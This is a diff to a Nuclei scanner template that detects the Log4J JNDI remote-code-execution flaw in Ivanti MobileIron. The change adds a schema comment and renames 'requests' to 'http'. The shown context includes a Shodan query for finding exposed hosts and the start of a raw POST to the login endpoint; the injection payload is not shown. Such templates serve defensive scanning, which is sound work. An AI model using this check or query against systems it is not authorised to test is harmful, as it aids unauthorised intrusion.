@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: mobileiron-log4j-jndi-rce
 info:
   name: Ivanti MobileIron Log4J JNDI RCE
@@ -17,7 +18,7 @@ info:
     verified: true
     shodan-query: http.html:"MobileIron"
   tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron
-requests:
+http:
   - raw:
       - |
         POST /mifs/j_spring_security_check HTTP/1.1
